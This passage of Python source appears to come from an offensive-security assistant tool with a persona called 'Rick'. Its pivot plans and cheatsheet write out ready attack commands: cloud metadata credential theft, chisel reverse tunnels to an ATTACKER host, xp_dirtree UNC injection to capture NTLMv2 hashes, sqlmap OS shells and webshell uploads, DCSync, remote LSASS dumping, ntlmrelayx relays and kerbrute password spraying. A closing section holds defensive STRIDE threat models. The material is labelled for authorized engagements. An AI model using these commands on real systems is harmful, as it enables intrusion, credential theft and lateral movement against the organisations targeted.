            "rick_note": "Docker socket mount = instant root on host. Check it first, every time. K8s service account tokens are the new domain creds — check what they can do. Container escape is the new privilege escalation.",
        },
        "cloud_instance": {
            "position": "Compromised Cloud Instance (EC2/Azure VM/GCE)",
            "immediate_actions": [
                "curl http://169.254.169.254/ — metadata service (IMDS)",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ — AWS IAM role",
                "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/' — Azure managed identity",
                "Check instance tags, user-data (often contains bootstrap scripts with creds)",
                "Cloud CLI tools installed? (aws, az, gcloud)",
                "env | grep -i AWS\\|AZURE\\|GCP\\|KEY\\|SECRET — cloud creds in env",
            ],
            "credential_hunting": [
                "Instance metadata IAM credentials (auto-rotating but useful NOW)",
                "User-data scripts with hardcoded creds",
                "Cloud CLI credential files (~/.aws/credentials, ~/.azure/)",
                "Application config files with cloud API keys",
                "Secrets Manager / Key Vault / Secret Manager access via instance role",
                "Other instances' metadata via SSRF if proxy-able",
            ],
            "cloud_pivot": [
                "Enumerate IAM permissions: what can this role/identity do?",
                "List S3/Blob/GCS buckets accessible to this role",
                "Check for cross-account role assumption",
                "Enumerate other compute instances",
                "Access managed databases (RDS, Azure SQL) via IAM auth",
                "Check for VPC peering / VPN to on-premises",
                "Lambda/Function/Cloud Function code — often contains secrets",
            ],
            "tunneling": {
                "chisel": "# chisel client ATTACKER:8080 R:socks — tunnel through cloud instance to internal VPC",
                "ssm_tunnel": "# AWS SSM: aws ssm start-session --target INSTANCE_ID (no SSH needed)",
                "ssh_to_internal": "Use cloud instance as jump box to VPC-internal resources",
            },
            "rick_note": "Cloud instances are the pivot point between cloud and internal. The metadata service is ALWAYS the first stop. IAM role permissions define your blast radius. Check what the role can touch — S3, Secrets Manager, other instances, databases. That's your map.",
        },
        "database_server": {
            "position": "Compromised Database Server",
            "immediate_actions": [
                "Identify DB type and version (MySQL, MSSQL, PostgreSQL, Oracle, MongoDB)",
                "Current user privileges — am I DBA/SA?",
                "List all databases and tables",
                "Check for linked servers (MSSQL: EXEC sp_linkedservers)",
                "Network connections from DB — what talks to this DB?",
                "Check for OS command execution capability",
            ],
            "os_command_execution": {
                "mssql": "xp_cmdshell 'whoami' — if SA, enable with sp_configure",
                "mysql": "SELECT sys_exec('whoami') — via UDF if FILE privilege",
                "postgresql": "COPY TO PROGRAM 'whoami' — if superuser",
                "oracle": "DBMS_SCHEDULER.CREATE_JOB with OS command",
                "mongodb": "db.adminCommand({}) — limited, but check for misconfig",
            },
            "credential_hunting": [
                "Database user password hashes — dump and crack",
                "Application connection strings stored in DB tables",
                "Linked server credentials (MSSQL)",
                "Database mail configurations with SMTP creds",
                "Job/agent configurations with credentials",
                "Transparent Data Encryption keys",
                "Application user tables (users, passwords, API keys)",
            ],
            "lateral_movement": [
                "MSSQL linked servers — crawl the chain (openquery cascading)",
                "Database links in Oracle — follow the links",
                "OS command execution → reverse shell → full pivot",
                "Credential reuse — DB admin passwords often reused on Windows/Linux",
                "UNC path injection (MSSQL) — steal NTLMv2 hashes: xp_dirtree '\\\\ATTACKER\\share'",
            ],
            "rick_note": "Databases are the connective tissue of every organization. MSSQL linked servers are the best kept secret — one SA account can chain through an entire environment. UNC path injection for hash stealing is chef's kiss. Always check linked servers.",
        },
        "network_device": {
            "position": "Compromised Network Device (Router/Switch/Firewall)",
            "immediate_actions": [
                "Identify device type and firmware version",
                "show running-config / show startup-config — full configuration",
                "show interfaces — all network segments",
                "show arp / show ip route — routing table and neighbor info",
                "show access-lists — firewall rules and ACLs",
                "show snmp — community strings",
                "show vlan — VLAN segmentation",
            ],
            "credential_hunting": [
                "Running config contains passwords (Type 5/7/8/9 hashes)",
                "SNMP community strings (often 'public' or 'private')",
                "TACACS+/RADIUS shared secrets",
                "VPN pre-shared keys",
                "Enable/privilege passwords",
                "SSH keys stored on device",
                "Type 7 passwords — instantly reversible",
            ],
            "network_pivot": [
                "Modify ACLs to allow traffic between segments",
                "Create GRE/VPN tunnels to bypass segmentation",
                "VLAN hopping if trunk ports misconfigured",
                "Route injection to redirect traffic",
                "SNMP write access → modify configs remotely",
                "Capture traffic (SPAN/mirror ports) for credential sniffing",
            ],
            "rick_note": "Network devices are infrastructure. Own the router, own the traffic. Type 7 passwords decode instantly. SNMP write access is root on a network device. This is where the builder's eye matters — understand the architecture to control it.",
        },
    }
    p = params.position.lower().strip()
    plan = plans.get(p)
    if not plan:
        return f"Error: Unknown position '{p}'. Available: {', '.join(plans.keys())}"
    result: dict[str, object] = dict(plan)
    if params.target_network:
        result["target_network"] = params.target_network
    result["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    return _fmt(result, params.response_format, title=f"{CALLSIGN} Pivot Plan")


async def rick_cheatsheet(params: CheatsheetInput) -> str:
    """Quick reference field manual for 10 core offensive tools. The commands you need in the heat of engagement."""
    sheets = {
        "nmap": {
            "tool": "Nmap — Network Mapper",
            "essential_scans": {
                "quick_discovery": "nmap -sn 10.10.10.0/24  # Ping sweep, host discovery",
                "full_tcp": "nmap -sS -sV -sC -p- -oA full_tcp TARGET  # Full TCP, service detection, default scripts",
                "top_udp": "nmap -sU --top-ports 100 -oA top_udp TARGET  # Top 100 UDP ports",
                "aggressive": "nmap -A -T4 -p- TARGET  # OS detection, version, scripts, traceroute",
                "stealth": "nmap -sS -T2 -f --data-length 24 TARGET  # Fragmented, slow, padded",
                "vuln_scan": "nmap --script vuln -p- TARGET  # Run all vuln scripts",
            },
            "useful_scripts": [
                "nmap --script smb-enum-shares,smb-enum-users TARGET  # SMB enum",
                "nmap --script http-enum,http-title,http-methods TARGET  # Web enum",
                "nmap --script ssl-enum-ciphers -p 443 TARGET  # TLS audit",
                "nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=DOMAIN -p 53 TARGET",
                "nmap -sV --script=banner -p- TARGET  # Banner grabbing",
            ],
            "output_formats": "Always use -oA for all formats (.nmap, .xml, .gnmap). Parse XML with nmap-parse-output or grep .gnmap.",
            "rick_note": "Full port scan (-p-) EVERY TIME. I've found critical vulns on port 50000+ more times than I can count. -sS -sV -sC -p- is the bread and butter.",
        },
        "burp": {
            "tool": "Burp Suite Professional — Web Proxy",
            "workflow": {
                "1_proxy_setup": "Set browser proxy to 127.0.0.1:8080. Install Burp CA cert. Use FoxyProxy for easy switching.",
                "2_scope": "Set target scope FIRST. Right-click > Add to scope. Show only in-scope items in Proxy history.",
                "3_crawl": "Target > Site map > right-click > Scan (crawl only first, then audit). Let it map the app.",
                "4_manual": "Walk the app manually. Click everything. Fill every form. Trigger every function. Watch Proxy history.",
                "5_repeater": "Send interesting requests to Repeater (Ctrl+R). Test parameters. Fuzz. Modify. Iterate.",
                "6_intruder": "For systematic fuzzing: Intruder > Sniper/Battering Ram/Pitchfork. SecLists payloads.",
            },
            "key_extensions": [
                "Authorize — automatic IDOR/access control testing across user roles",
                "Logger++ — enhanced logging with regex filtering",
                "Param Miner — hidden parameter discovery",
                "JWT Editor — JWT manipulation, algorithm confusion, key injection",
                "Hackvertor — encoding/decoding/payload transformation",
                "Active Scan++ — enhanced active scanning",
            ],
            "shortcuts": {
                "send_to_repeater": "Ctrl+R",
                "send_to_intruder": "Ctrl+I",
                "forward_intercept": "Ctrl+F",
                "toggle_intercept": "Ctrl+T (in Proxy tab)",
                "url_encode": "Ctrl+U (in Repeater/Intruder)",
            },
            "rick_note": "Burp is home base. The Authorize extension is the single most valuable plugin — it catches IDOR/BOLA that you'd miss manually. Always run it. Always set scope first. And ALWAYS walk the app manually before scanning.",
        },
        "ffuf": {
            "tool": "ffuf — Fuzz Faster U Fool",
            "common_usage": {
                "dir_discovery": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
                "file_discovery": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt",
                "extension_fuzz": "ffuf -u https://TARGET/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.html,.js,.txt,.bak,.old",
                "vhost_discovery": "ffuf -u https://TARGET -H 'Host: FUZZ.target.com' -w subdomains.txt -fs SIZE_OF_DEFAULT",
                "parameter_fuzz": "ffuf -u https://TARGET/page?FUZZ=value -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs SIZE",
                "post_data_fuzz": "ffuf -u https://TARGET/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt -fc 401",
                "recursive": "ffuf -u https://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2",
            },
            "filters": {
                "by_status": "-mc 200,301 (match codes) or -fc 404,403 (filter codes)",
                "by_size": "-fs 1234 (filter size) or -ms 5000 (match size)",
                "by_words": "-fw 42 (filter word count) or -mw 100 (match word count)",
                "by_lines": "-fl 10 (filter line count)",
                "by_regex": "-fr 'not found' (filter regex in response)",
            },
            "pro_tips": [
                "Use -fs to filter default response size (run one request first to get it)",
                "Rate limit with -rate 100 to avoid lockouts/WAF blocks",
                "Output to file: -o results.json -of json",
                "Multiple wordlists: -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2",
                "Use -H 'Cookie: session=xxx' for authenticated fuzzing",
            ],
            "rick_note": "ffuf over Gobuster every time — it's faster and more flexible. The -fs filter is your best friend. Always check for .bak, .old, .swp files — developers leave gold in backup files.",
        },
        "hashcat": {
            "tool": "Hashcat — Advanced Password Recovery",
            "common_modes": {
                "ntlm": "-m 1000  # Windows NTLM hashes",
                "ntlmv2": "-m 5600  # NTLMv2 (Responder captures)",
                "kerberoast": "-m 13100  # Kerberos TGS-REP (Kerberoasting)",
                "asrep": "-m 18200  # Kerberos AS-REP (AS-REP Roasting)",
                "md5": "-m 0  # MD5",
                "sha1": "-m 100  # SHA1",
                "sha256": "-m 1400  # SHA256",
                "sha512": "-m 1800  # SHA512 Unix ($6$)",
                "bcrypt": "-m 3200  # bcrypt ($2*$)",
                "mssql": "-m 1731  # MSSQL 2012+",
                "mysql": "-m 300  # MySQL4.1/5+",
                "wpa2": "-m 22000  # WPA-PBKDF2-PMKID+EAPOL",
            },
            "attack_modes": {
                "dictionary": "hashcat -m MODE hash.txt wordlist.txt",
                "dictionary_rules": "hashcat -m MODE hash.txt wordlist.txt -r OneRuleToRuleThemAll.rule",
                "combinator": "hashcat -m MODE hash.txt -a 1 wordlist1.txt wordlist2.txt",
                "brute_force": "hashcat -m MODE hash.txt -a 3 ?a?a?a?a?a?a?a?a  # 8-char all charset",
                "mask_attack": "hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?l?d?d  # Pattern: Abcdef12",
                "hybrid": "hashcat -m MODE hash.txt -a 6 wordlist.txt ?d?d?d  # word + 3 digits",
            },
            "charsets": "?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all ?b=binary. Custom: -1 ?l?d (custom charset 1)",
            "pro_tips": [
                "Always try: rockyou.txt + OneRuleToRuleThemAll.rule first",
                "Potfile: hashcat stores cracked hashes in ~/.hashcat/hashcat.potfile",
                "--show: display already cracked hashes",
                "--username: if hash file has username:hash format",
                "-O: optimized kernels (faster but max 32 char passwords)",
                "Identify unknown hashes: hashid or haiti",
            ],
            "rick_note": "OneRuleToRuleThemAll + rockyou.txt cracks 70%+ of passwords in most environments. For Kerberoasting, always try rules before brute force — service account passwords are often just complex enough to resist straight dictionary but fall to rules.",
        },
        "bloodhound": {
            "tool": "BloodHound — AD Attack Path Mapper",
            "collection": {
                "sharphound_all": "SharpHound.exe -c All --zipfilename bloodhound.zip",
                "sharphound_stealth": "SharpHound.exe -c DCOnly --stealth",
                "bloodhound_py": "bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_FQDN -c All",
                "from_linux": "bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All",
            },
            "key_queries": [
                "Find all Domain Admins",
                "Shortest Paths to Domain Admin from Owned Principals",
                "Find Principals with DCSync Rights",
                "Find computers where Domain Users are local admin",
                "Find Kerberoastable Accounts with most privileges",
                "Find AS-REP Roastable Users",
                "Shortest Paths to High Value Targets",
                "Find all computers with Unconstrained Delegation",
            ],
            "cusrick_cypher": {
                "kerberoastable_with_path": "MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p",
                "users_with_dcsync": "MATCH p=(u)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p",
                "computers_no_laps": "MATCH (c:Computer {haslaps:false}) RETURN c.name",
            },
            "workflow": [
                "1. Collect with SharpHound/bloodhound-python",
                "2. Import ZIP into BloodHound GUI",
                "3. Mark owned principals (right-click > Mark as Owned)",
                "4. Run 'Shortest Paths from Owned' queries",
                "5. Identify attack path — each edge is a technique",
                "6. Execute the path: abuse each relationship",
                "7. Mark newly owned principals, repeat",
            ],
            "rick_note": "BloodHound FIRST, always. Before you touch anything else in AD, run collection and map the paths. The graph doesn't lie. Mark your starting position, find the shortest path to DA, and walk it. Every edge in the graph is a technique — learn them all.",
        },
        "impacket": {
            "tool": "Impacket — Python Network Protocol Library",
            "authentication_formats": {
                "password": "DOMAIN/user:password@target",
                "ntlm_hash": "DOMAIN/user@target -hashes LM:NT",
                "kerberos": "DOMAIN/user@target -k -no-pass (with valid ccache)",
            },
            "key_tools": {
                "secretsdump": "impacket-secretsdump DOMAIN/user:pass@DC  # DCSync, SAM dump, LSA secrets",
                "psexec": "impacket-psexec DOMAIN/user:pass@target  # Interactive shell via service",
                "wmiexec": "impacket-wmiexec DOMAIN/user:pass@target  # Semi-interactive via WMI",
                "smbexec": "impacket-smbexec DOMAIN/user:pass@target  # Shell via SMB service",
                "atexec": "impacket-atexec DOMAIN/user:pass@target 'command'  # Execute via scheduled task",
                "dcomexec": "impacket-dcomexec DOMAIN/user:pass@target  # Shell via DCOM",
                "ntlmrelayx": "impacket-ntlmrelayx -t TARGET -smb2support  # NTLM relay attack",
                "getST": "impacket-getST -spn cifs/target DOMAIN/user:pass -impersonate admin  # S4U2Self/S4U2Proxy",
                "getTGT": "impacket-getTGT DOMAIN/user:pass  # Request TGT, save to ccache",
                "GetNPUsers": "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass  # AS-REP Roast",
                "GetUserSPNs": "impacket-GetUserSPNs DOMAIN/user:pass -request  # Kerberoast",
                "smbclient": "impacket-smbclient DOMAIN/user:pass@target  # Interactive SMB client",
            },
            "pro_tips": [
                "secretsdump with -just-dc-ntlm for just NTLM hashes (faster)",
                "Use -k flag with KRB5CCNAME env var for Kerberos auth",
                "ntlmrelayx -socks for persistent SOCKS proxy through relayed sessions",
                "getST for constrained delegation abuse (S4U2Proxy)",
                "mssqlclient.py for MSSQL interaction with Impacket auth",
            ],
            "rick_note": "Impacket is the Swiss Army knife of AD pentesting. secretsdump is the endgame tool — DCSync everything. ntlmrelayx with -socks is incredibly powerful for maintaining access through relayed sessions. Learn every tool in the suite.",
        },
        "crackmapexec": {
            "tool": "CrackMapExec (CME/NetExec) — Swiss Army Knife for Networks",
            "protocols": "smb, ldap, winrm, mssql, ssh, rdp, ftp",
            "essential_commands": {
                "smb_spray": "cme smb SUBNET/24 -u user -p password  # Password spray across subnet",
                "smb_pth": "cme smb TARGET -u user -H NTHASH  # Pass-the-Hash",
                "enum_shares": "cme smb TARGET -u user -p pass --shares  # Enumerate shares",
                "enum_users": "cme smb TARGET -u user -p pass --users  # Enumerate domain users",
                "enum_sessions": "cme smb TARGET -u user -p pass --sessions  # Active sessions",
                "enum_logged_on": "cme smb TARGET -u user -p pass --loggedon-users  # Logged on users",
                "sam_dump": "cme smb TARGET -u admin -p pass --sam  # Dump local SAM",
                "lsa_dump": "cme smb TARGET -u admin -p pass --lsa  # Dump LSA secrets",
                "ntds_dump": "cme smb DC -u DA -p pass --ntds  # Dump NTDS.dit (domain hashes)",
                "command_exec": "cme smb TARGET -u admin -p pass -x 'whoami'  # Execute command",
                "ps_exec": "cme smb TARGET -u admin -p pass -X 'Get-Process'  # PowerShell exec",
                "winrm_exec": "cme winrm TARGET -u user -p pass -x 'whoami'  # WinRM command",
                "mssql_exec": "cme mssql TARGET -u sa -p pass -x 'whoami'  # MSSQL xp_cmdshell",
            },
            "modules": [
                "cme smb TARGET -u user -p pass -M spider_plus  # Spider shares for files",
                "cme smb TARGET -u user -p pass -M lsassy  # Remote LSASS dump",
                "cme smb TARGET -u user -p pass -M gpp_password  # Find GPP passwords",
                "cme smb TARGET -u user -p pass -M webdav  # Check WebDAV",
                "cme ldap TARGET -u user -p pass -M get-desc-users  # Users with passwords in description",
            ],
            "rick_note": "CME is the lateral movement workhorse. Spray a subnet, find local admin, dump SAM, move on. The spider_plus module finds sensitive files on shares. lsassy module for remote credential dumping without touching disk. Beautiful tool.",
        },
        "chisel": {
            "tool": "Chisel — TCP/UDP Tunneling over HTTP",
            "setup": {
                "server_reverse": "# On your attack machine:\nchisel server -p 8080 --reverse",
                "client_socks": "# On compromised host:\nchisel client YOUR_IP:8080 R:socks\n# Creates SOCKS5 proxy on attacker port 1080",
                "client_portfwd": "# Forward specific port:\nchisel client YOUR_IP:8080 R:8445:INTERNAL_TARGET:445\n# Access internal SMB on your localhost:8445",
                "client_multi": "# Multiple forwards:\nchisel client YOUR_IP:8080 R:socks R:3389:DC:3389 R:1433:SQLSRV:1433",
            },
            "usage_with_tools": {
                "proxychains": "# /etc/proxychains4.conf: socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn INTERNAL_TARGET\nproxychains cme smb INTERNAL_SUBNET/24 -u user -p pass",
                "firefox": "Network Settings > Manual proxy > SOCKS Host 127.0.0.1 Port 1080",
                "burp_upstream": "User Options > Connections > SOCKS proxy > 127.0.0.1:1080",
                "evil_winrm": "proxychains evil-winrm -i INTERNAL_TARGET -u user -p pass",
                "rdp": "proxychains xfreerdp /v:INTERNAL_TARGET /u:user /p:pass",
            },
            "alternatives": {
                "ligolo_ng": "Faster, TUN interface (no proxychains needed). Better for large-scale pivoting.",
                "ssh_dynamic": "ssh -D 9050 user@pivot — if SSH access available.",
                "socat": "socat TCP-LISTEN:LOCAL,fork TCP:REMOTE:PORT — simple port forward.",
            },
            "rick_note": "Chisel is the go-to for HTTP tunneling when SSH isn't available. Reverse SOCKS is the move — one tunnel, access everything internal through proxychains. For bigger engagements, Ligolo-ng with its TUN interface is cleaner. The tunnel is the bridge between your position and the target — build it solid.",
        },
        "sqlmap": {
            "tool": "SQLMap — Automated SQL Injection",
            "basic_usage": {
                "get_param": "sqlmap -u 'https://TARGET/page?id=1' --batch",
                "post_param": "sqlmap -u 'https://TARGET/login' --data 'user=admin&pass=test' -p pass --batch",
                "cookie_inject": "sqlmap -u 'https://TARGET/page' --cookie='id=1*' --batch",
                "header_inject": "sqlmap -u 'https://TARGET/page' --headers='X-Forwarded-For: 1*' --batch",
                "from_burp": "sqlmap -r request.txt --batch  # Save request from Burp > Copy to file",
            },
            "enumeration": {
                "databases": "sqlmap -r req.txt --dbs",
                "tables": "sqlmap -r req.txt -D database_name --tables",
                "columns": "sqlmap -r req.txt -D database_name -T table_name --columns",
                "dump": "sqlmap -r req.txt -D database_name -T table_name --dump",
                "current_user": "sqlmap -r req.txt --current-user",
                "is_dba": "sqlmap -r req.txt --is-dba",
                "passwords": "sqlmap -r req.txt --passwords",
            },
            "exploitation": {
                "os_shell": "sqlmap -r req.txt --os-shell  # Interactive OS command shell",
                "os_cmd": "sqlmap -r req.txt --os-cmd='whoami'  # Single OS command",
                "file_read": "sqlmap -r req.txt --file-read='/etc/passwd'",
                "file_write": "sqlmap -r req.txt --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
                "sql_shell": "sqlmap -r req.txt --sql-shell  # Interactive SQL prompt",
            },
            "pro_tips": [
                "--risk 3 --level 5 for thorough testing (slower, more payloads)",
                "--technique=BT for blind + time-based only (stealthier)",
                "--tamper=space2comment,randomcase for basic WAF bypass",
                "--proxy=http://127.0.0.1:8080 to route through Burp",
                "--second-url for second-order SQLi",
                "--threads 10 for faster exploitation (be careful with time-based)",
                "--forms to auto-detect and test form parameters",
            ],
            "rick_note": "Always try manual injection in Burp first. SQLMap is the automation layer after you've confirmed the vuln exists. Save the request from Burp (-r flag) — it handles cookies, headers, tokens automatically. --os-shell is the money shot when you're DBA.",
        },
        "kerbrute": {
            "tool": "Kerbrute — Kerberos Pre-Auth Brute Forcer",
            "usage": {
                "user_enum": "kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt  # Enumerate valid users without lockout",
                "password_spray": "kerbrute passwordspray -d DOMAIN --dc DC_IP userlist.txt 'Password123!'  # Spray single password",
                "brute_force": "kerbrute bruteuser -d DOMAIN --dc DC_IP passwords.txt username  # Brute single user",
            },
            "why_kerbrute": [
                "Kerberos pre-auth doesn't trigger traditional logon failure events (4625)",
                "Faster than LDAP/SMB-based spraying",
                "Only generates 4768 events (TGT requests) — often not monitored",
                "Valid user enumeration without any valid credentials",
                "No account lockout risk for user enumeration (invalid users get different error)",
            ],
            "user_lists": [
                "Generate from LinkedIn: first.last, f.last, firstl formats",
                "SecLists/Usernames/Names/names.txt for common first names",
                "statistically-likely-usernames on GitHub for format-specific lists",
                "Combine with company-specific patterns (jsmith, john.smith, smithj)",
            ],
            "spray_strategy": [
                "1. Enumerate valid users first (userenum)",
                "2. Check domain password policy (net accounts /domain or LDAP)",
                "3. Spray ONE password across all users",
                "4. Wait for lockout window (usually 30 min)",
                "5. Spray next password",
                "6. Common sprays: Season+Year (Spring2024!), Company+123, Welcome1!",
            ],
            "rick_note": "Kerbrute for user enumeration is pure gold — no creds needed, no lockouts, minimal logging. For spraying, ALWAYS check the lockout policy first. Season+Year! is the most common password pattern in corporate environments. One spray, then wait.",
        },
    }
    t = params.tool.lower().strip()
    sheet = sheets.get(t)
    if not sheet:
        return f"Error: Unknown tool '{t}'. Available: {', '.join(sheets.keys())}"
    sheet["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    return _fmt(sheet, params.response_format, title=f"{CALLSIGN} Field Manual")


async def rick_threat_model(params: ThreatModelInput) -> str:
    """STRIDE-based threat modeling by system type. Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege."""
    models = {
        "web_app": {
            "system": "Web Application",
            "trust_boundaries": [
                "Browser ↔ Web Server",
                "Web Server ↔ Database",
                "Web Server ↔ Auth Provider",
                "Web Server ↔ Third-Party APIs",
                "CDN ↔ Origin",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Session hijacking",
                        "Credential stuffing",
                        "Cookie theft",
                        "JWT forgery",
                        "OAuth token theft",
                    ],
                    "mitigations": [
                        "MFA",
                        "Secure session management (HttpOnly, Secure, SameSite)",
                        "CSRF tokens",
                        "JWT validation with strong keys",
                        "Short-lived tokens",
                    ],
                },
                "tampering": {
                    "threats": [
                        "SQL injection",
                        "XSS payload injection",
                        "Parameter tampering",
                        "Request body manipulation",
                        "Cache poisoning",
                    ],
                    "mitigations": [
                        "Parameterized queries",
                        "Input validation + output encoding",
                        "Server-side validation",
                        "HMAC on critical params",
                        "Cache-Control headers",
                    ],
                },
                "repudiation": {
                    "threats": ["Missing audit logs", "Log injection", "Timestamp manipulation", "Anonymous actions"],
                    "mitigations": [
                        "Comprehensive audit logging",
                        "Log integrity protection",
                        "NTP sync",
                        "Require authentication for state changes",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Verbose errors/stack traces",
                        "Directory listing",
                        "Source code exposure",
                        "Hardcoded secrets in JS",
                        "IDOR exposing other users' data",
                    ],
                    "mitigations": [
                        "Custom error pages",
                        "Disable directory listing",
                        "Server-side rendering for sensitive data",
                        "Secrets management",
                        "Authorization on every resource",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Application-layer DoS",
                        "ReDoS",
                        "Resource exhaustion",
                        "File upload abuse",
                        "API rate limit bypass",
                    ],
                    "mitigations": [
                        "Rate limiting",
                        "WAF",
                        "Input length limits",
                        "File size/type restrictions",
                        "Queue-based processing",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "IDOR/BOLA",
                        "Mass assignment",
                        "JWT claim manipulation",
                        "Role parameter tampering",
                        "Path traversal to admin",
                    ],
                    "mitigations": [
                        "Server-side authorization on every request",
                        "Whitelist allowed fields",
                        "JWT signature verification",
                        "RBAC enforcement",
                        "Principle of least privilege",
                    ],
                },
            },
            "rick_note": "Trust boundaries are where vulns live. Focus on browser-to-server and server-to-database boundaries first. Every data flow crossing a boundary needs validation.",
        },
        "api": {
            "system": "API (REST/GraphQL)",
            "trust_boundaries": [
                "Client ↔ API Gateway",
                "API Gateway ↔ Microservices",
                "Service ↔ Database",
                "Service ↔ Service",
                "API ↔ External APIs",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "API key theft",
                        "JWT algorithm confusion",
                        "OAuth redirect manipulation",
                        "Stolen bearer tokens",
                        "Service-to-service impersonation",
                    ],
                    "mitigations": [
                        "Short-lived tokens with refresh",
                        "Strong JWT validation (RS256+)",
                        "Strict redirect URI validation",
                        "mTLS for service-to-service",
                        "API key rotation",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Mass assignment",
                        "GraphQL injection",
                        "Request body manipulation",
                        "Batch operation abuse",
                        "Content-Type confusion",
                    ],
                    "mitigations": [
                        "Explicit field whitelisting",
                        "Query depth/complexity limits",
                        "Schema validation",
                        "Request signing",
                        "Strict Content-Type enforcement",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Missing request logging",
                        "No correlation IDs",
                        "Unsigned webhooks",
                        "Anonymous API access",
                    ],
                    "mitigations": [
                        "Structured request/response logging",
                        "Correlation ID propagation",
                        "Webhook signature verification",
                        "Authentication required",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Excessive data exposure",
                        "GraphQL introspection in prod",
                        "Verbose errors with internals",
                        "API version info leakage",
                        "Broken object-level auth",
                    ],
                    "mitigations": [
                        "Response field filtering",
                        "Disable introspection in prod",
                        "Generic error responses",
                        "Remove version headers",
                        "BOLA checks on every endpoint",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "GraphQL query bombing",
                        "Pagination abuse",
                        "Large payload attacks",
                        "Recursive query depth",
                        "Resource-intensive operations",
                    ],
                    "mitigations": [
                        "Query complexity analysis",
                        "Cursor-based pagination with limits",
                        "Request size limits",
                        "Depth limiting",
                        "Async processing for heavy ops",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "BOLA/IDOR across resources",
                        "Function-level access control bypass",
                        "Horizontal privilege escalation",
                        "Admin endpoint discovery",
                        "Broken object property level auth",
                    ],
                    "mitigations": [
                        "Authorization middleware on every endpoint",
                        "RBAC/ABAC enforcement",
                        "User context validation",
                        "Admin endpoints on separate network",
                        "Field-level access control",
                    ],
                },
            },
            "rick_note": "BOLA is API threat #1. Model every endpoint with the question: 'Can user A access user B's data?' GraphQL introspection in prod = handing attackers the map.",
        },
        "microservices": {
            "system": "Microservices Architecture",
            "trust_boundaries": [
                "External ↔ API Gateway",
                "Gateway ↔ Services",
                "Service ↔ Service",
                "Service ↔ Data Store",
                "Service ↔ Message Queue",
                "Service ↔ Secrets Manager",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Service impersonation on internal network",
                        "Stolen service credentials",
                        "Man-in-the-middle between services",
                        "Rogue container deployment",
                    ],
                    "mitigations": [
                        "mTLS between all services (service mesh)",
                        "Workload identity (SPIFFE/SPIRE)",
                        "Network policies restricting service communication",
                        "Image signing and verification",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Message queue poisoning",
                        "Shared database corruption",
                        "Config injection via environment",
                        "Supply chain compromise of base images",
                    ],
                    "mitigations": [
                        "Message signing/validation",
                        "Database per service pattern",
                        "Sealed secrets",
                        "Image scanning and SBOM",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Distributed tracing gaps",
                        "Inconsistent logging across services",
                        "Lost messages in async flows",
                        "No audit trail for service-to-service calls",
                    ],
                    "mitigations": [
                        "Centralized logging (ELK/Loki)",
                        "Distributed tracing (Jaeger/Zipkin)",
                        "Dead letter queues with monitoring",
                        "Request correlation IDs",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Secrets in environment variables",
                        "Service discovery metadata leakage",
                        "Debug endpoints exposed",
                        "Container logs with sensitive data",
                    ],
                    "mitigations": [
                        "External secrets manager (Vault)",
                        "Network policies limiting discovery",
                        "Remove debug endpoints in prod",
                        "Structured logging with PII redaction",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Cascading failures",
                        "Resource starvation from noisy neighbor",
                        "Message queue flooding",
                        "Connection pool exhaustion",
                    ],
                    "mitigations": [
                        "Circuit breakers (Hystrix/Resilience4j)",
                        "Resource limits per service",
                        "Queue backpressure and rate limiting",
                        "Connection pooling with limits",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Overpermissioned service accounts",
                        "Container escape to host",
                        "Shared namespace access",
                        "Kubernetes RBAC bypass",
                    ],
                    "mitigations": [
                        "Least privilege service accounts",
                        "Non-root containers, read-only filesystem",
                        "Namespace isolation with network policies",
                        "Regular RBAC audit",
                    ],
                },
            },
            "rick_note": "In microservices, the network IS the attack surface. mTLS everywhere. Network policies default deny. Every service boundary is a trust boundary. Build it like a submarine — compartmentalized so one breach doesn't sink the ship.",
        },
        "mobile_app": {
            "system": "Mobile Application",
            "trust_boundaries": [
                "Device ↔ API",
                "App ↔ Local Storage",
                "App ↔ OS Services",
                "App ↔ Third-Party SDKs",
                "App ↔ Push Notifications",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Certificate pinning bypass",
                        "Biometric bypass",
                        "Deep link hijacking",
